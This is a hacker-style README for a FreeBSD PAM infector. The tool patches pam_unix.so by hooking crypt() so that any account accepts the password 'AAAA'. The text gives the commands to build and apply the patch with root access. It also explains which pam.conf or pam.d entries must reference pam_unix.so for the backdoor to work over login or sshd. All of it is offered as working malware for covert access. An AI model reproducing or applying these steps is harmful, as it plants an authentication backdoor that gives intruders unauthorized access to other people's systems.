
                  -== FreeBSD (x86) PAM infector ==-

--[ What da fuck is this?

  This ware hooks crypt() function call to libc, so the only thing it needs
  is offsets in  /usr/lib/pam_unix.so file,  to get them easily there  is a
  make_patch.pl utility.. and sure u need root ^))


--[ Okay, and how to compile?

  # chmod +x make_patch.pl

  to get info:
  # ./make_patch.pl

  to compile:
  # ./make_patch.pl build

  advanced mode (dont foget to edit offsets in file)
  # gcc -o patch patch.c

  d0 evil things:
  # cp /usr/lib/pam_unix.so ./pam_unix.bak  # safety first
  # ./patch   # don't run twice, it can kill PAM !! =D


--[ How to use?

  Check at first file /etc/pam.conf (it actual in 4.x), if u find records
  like
  ...
  login   auth     required       /usr/lib/pam_unix
  ...

  then its okay.

  In case of pam.d directory: check files sshd, login and etc. If there are
  strings like this there:

#
# $FreeBSD: src/etc/pam.d/login,v 1.11 2002/05/08 00:33:02 des Exp $
#
# PAM configuration for the "login" service
#

# auth
auth		required	pam_nologin.so	no_warn
auth		sufficient	pam_self.so	no_warn
auth		sufficient	pam_opie.so	no_warn no_fake_prompts
auth		requisite	pam_opieaccess.so	no_warn
#auth		sufficient	pam_kerberosIV.so	no_warn try_first_pass
#auth		sufficient	pam_krb5.so	no_warn try_first_pass
#auth		sufficient	pam_ssh.so	no_warn try_first_pass
auth		required	pam_unix.so	no_warn try_first_pass nullok
               ^^^^^^^^^^ NOTE!!

  then all right.

  Now u can login in system via terminal or sshd or whatever recorded in
  pam configs with ANY LOGIN and PASSWORD "AAAA" =D